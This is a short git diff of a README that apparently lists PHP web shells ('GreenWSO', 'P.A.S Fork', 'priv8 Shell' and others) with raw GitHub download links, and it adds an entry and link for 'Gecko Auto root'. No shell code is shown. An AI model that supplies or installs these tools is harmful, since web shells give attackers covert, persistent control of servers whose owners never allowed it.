@@ -7,6 +7,7 @@
 v3
 ```
 
+* Gecko Auto root [gk]
 * GreenWSO [gw]
 * idx-v3 shell [idx]
 * P.A.S Fork [PaS]
@@ -19,7 +20,7 @@ v3
 * Ophellia shell [OPL]
 * Ngiiix1337 priv8 Shell [PRIV]
 
-
+[gk]: https://raw.githubusercontent.com/liiuxii/zxc/main/gk.php
 [gw]: https://raw.githubusercontent.com/liiuxii/zxc/main/gw.php
 [idx]: https://raw.githubusercontent.com/liiuxii/zxc/main/shell-v3.php
 [PaS]: https://raw.githubusercontent.com/liiuxii/zxc/main/pas_fork.php
